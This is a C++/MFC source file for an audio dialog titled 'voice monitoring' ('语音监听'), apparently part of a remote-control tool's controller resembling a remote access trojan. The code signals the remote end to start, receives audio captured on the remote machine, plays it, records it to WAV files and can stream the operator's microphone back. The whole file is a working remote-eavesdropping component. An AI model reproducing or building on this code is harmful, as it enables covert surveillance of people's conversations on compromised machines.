// AudioDlg.cpp : implementation file
//

#include "stdafx.h"
#include "TSPClientPublic.h"
#include "TSPClient.h"
#include "AudioDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CAudioDlg dialog

CAudioDlg::CAudioDlg(CWnd* pParent, CIOCPServer* pIOCPServer, ClientContext *pContext)
	: CDialog(CAudioDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CAudioDlg)
	m_bIsSendLocalAudio = FALSE;
	//}}AFX_DATA_INIT

	m_hIcon			= LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_AUDIO));
	m_iocpServer	= pIOCPServer;
	m_pContext		= pContext;
	m_bIsWorking	= TRUE;

	m_nTotalRecvBytes = 0;

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	BOOL bResult = getpeername(m_pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);
	
	m_IPAddress = bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "";
	m_bAudioRec = FALSE;
	m_hFileRec = INVALID_HANDLE_VALUE;
	InitFileHeader();
}


void CAudioDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CAudioDlg)
	DDX_Check(pDX, IDC_SEND_LOCALAUDIO, m_bIsSendLocalAudio);
	//}}AFX_DATA_MAP
}

BEGIN_MESSAGE_MAP(CAudioDlg, CDialog)
	//{{AFX_MSG_MAP(CAudioDlg)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_SEND_LOCALAUDIO, OnSendLocalaudio)
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_BTN_RECORD, &CAudioDlg::OnBnClickedBtnRecord)
	ON_BN_CLICKED(IDC_BTN_STOPREC, &CAudioDlg::OnBnClickedBtnStoprec)
	ON_WM_DESTROY()
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CAudioDlg message handlers


BOOL CAudioDlg::OnInitDialog() 
{
	CDialog::OnInitDialog();
	
	// TODO: Add extra initialization here
	
	// Set the icon for this dialog.  The framework does this automatically
	//  when the application's main window is not a dialog
	SetIcon(m_hIcon, TRUE);			// Set big icon
	SetIcon(m_hIcon, FALSE);		// Set small icon

	CString str;
	str.Format("\\\\%s - 语音监听", m_IPAddress);
	SetWindowText(str);

	// 通知远程控制端对话框已经打开
	BYTE bToken = COMMAND_NEXT;
	m_iocpServer->Send(m_pContext, &bToken, sizeof(BYTE));

	m_hWorkThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);
	return TRUE;
}

void CAudioDlg::OnReceiveComplete()
{
	m_nTotalRecvBytes += m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
	CString	str;
 	str.Format("Receive %d KBytes", m_nTotalRecvBytes / 1024);
	SetDlgItemText(IDC_TIPS, str);
	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
	case TOKEN_AUDIO_DATA:

		if (TRUE)
		{
			BYTE *pBuf = m_pContext->m_DeCompressionBuffer.GetBuffer(1);
			DWORD nLen = m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1;
			m_Audio.playBuffer(pBuf, nLen);

			if (m_bAudioRec)
			{
				DWORD dwWrite;
				WriteFile(m_hFileRec, pBuf, nLen, &dwWrite, NULL);
			}
		}
		
		break;

	default:
		// 传输发生异常数据
		return;
	}	
}

void CAudioDlg::OnReceive()
{
	
}

void CAudioDlg::OnClose() 
{
	// TODO: Add your message handler code here and/or call default
	// TODO: Add your message handler code here and/or call default
	m_pContext->m_Dialog[0] = 0;
	
	closesocket(m_pContext->m_Socket);

	m_bIsWorking = FALSE;
	WaitForSingleObject(m_hWorkThread, INFINITE);
	CDialog::OnClose();
}

void CAudioDlg::OnSendLocalaudio() 
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
}

// 负责发送本地语音
DWORD WINAPI CAudioDlg::WorkThread(LPVOID lparam)
{
	CAudioDlg	*pThis = (CAudioDlg *)lparam;

	while (pThis->m_bIsWorking)
	{
		if (!pThis->m_bIsSendLocalAudio)
		{
			Sleep(1000);
			continue;
		}
		DWORD	dwBytes = 0;
		LPBYTE	lpBuffer = pThis->m_Audio.getRecordBuffer(&dwBytes);
		if (lpBuffer != NULL && dwBytes > 0)
			pThis->m_iocpServer->Send(pThis->m_pContext, lpBuffer, dwBytes);
	}
	return 0;
}


void CAudioDlg::OnBnClickedBtnRecord()
{
	CString strFilter = _T("wav Files (*.wav)|*.wav|All Files (*.*)|*.*||");
	CFileDialog dlg(FALSE, _T("保存录音"), NULL, OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT, strFilter, this);
	if (IDOK != dlg.DoModal())
	{
		return;
	}

	m_strFileRec = dlg.GetPathName();
	if (m_strFileRec.IsEmpty())
	{
		::MessageBox(NULL,"保存录音文件为空!","提示",MB_OK|MB_ICONINFORMATION);

		return;
	}

	if (!StartRec())
	{
		::MessageBox(NULL,"打开录音文件失败","提示",MB_OK|MB_ICONINFORMATION);
	}
}


void CAudioDlg::OnBnClickedBtnStoprec()
{
	StopRec();
}


BOOL CAudioDlg::StopRec()
{
	if (!m_bAudioRec)
	{
		return TRUE;
	}

	SetFilePointer(m_hFileRec, 0, 0, FILE_BEGIN);
	// 	m_headFile.nSizeFile = m_nSizeWave + sizeof(WAVEFILE_HEADER) - 8;
	DWORD nLeng = GetFileSize(m_hFileRec, NULL);
	m_headFile.nSizeFile = nLeng - 8;
	m_headFile.nSizeWave = m_headFile.nSizeFile - sizeof(WAVEFILE_HEADER) + 8;

	DWORD dwWrite = 0;
	WriteFile(m_hFileRec, &m_headFile, sizeof(m_headFile), &dwWrite, NULL);

	CloseHandle(m_hFileRec);
	m_hFileRec = INVALID_HANDLE_VALUE;

	m_bAudioRec = FALSE;

	return TRUE;
}


BOOL CAudioDlg::StartRec()
{
	if (m_bAudioRec)
	{
		StopRec();
	}

	m_hFileRec = ::CreateFile(m_strFileRec, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
	if (INVALID_HANDLE_VALUE == m_hFileRec)
	{
		return FALSE;
	}

	DWORD dwWrite = 0;
	WriteFile(m_hFileRec, &m_headFile, sizeof(WAVEFILE_HEADER), &dwWrite, NULL);
	m_bAudioRec = TRUE;

	return TRUE;
}


BOOL CAudioDlg::InitFileHeader()
{
	m_headFile.szRiff[0] = 'R';
	m_headFile.szRiff[1] = 'I';
	m_headFile.szRiff[2] = 'F';
	m_headFile.szRiff[3] = 'F';

	m_headFile.szWave[0] = 'W';
	m_headFile.szWave[1] = 'A';
	m_headFile.szWave[2] = 'V';
	m_headFile.szWave[3] = 'E';

	m_headFile.szfmt[0] = 'f';
	m_headFile.szfmt[1] = 'm';
	m_headFile.szfmt[2] = 't';
	m_headFile.szfmt[3] = ' ';

	m_headFile.nSizeFormate = sizeof(GSM610WAVEFORMAT);

	m_headFile.pfm.wfx.wFormatTag = WAVE_FORMAT_GSM610;
	m_headFile.pfm.wfx.nChannels = 1;
	m_headFile.pfm.wfx.nSamplesPerSec = 8000;
	m_headFile.pfm.wfx.nAvgBytesPerSec = 1625;
	m_headFile.pfm.wfx.nBlockAlign = 65;
	m_headFile.pfm.wfx.wBitsPerSample = 0;
	m_headFile.pfm.wfx.cbSize = 2;
	m_headFile.pfm.wSamplesPerBlock = 320;	


	m_headFile.szData[0] = 'd';
	m_headFile.szData[1] = 'a';
	m_headFile.szData[2] = 't';
	m_headFile.szData[3] = 'a';

	return TRUE;
}

void CAudioDlg::OnDestroy()
{
	CDialog::OnDestroy();

	StopRec();
}
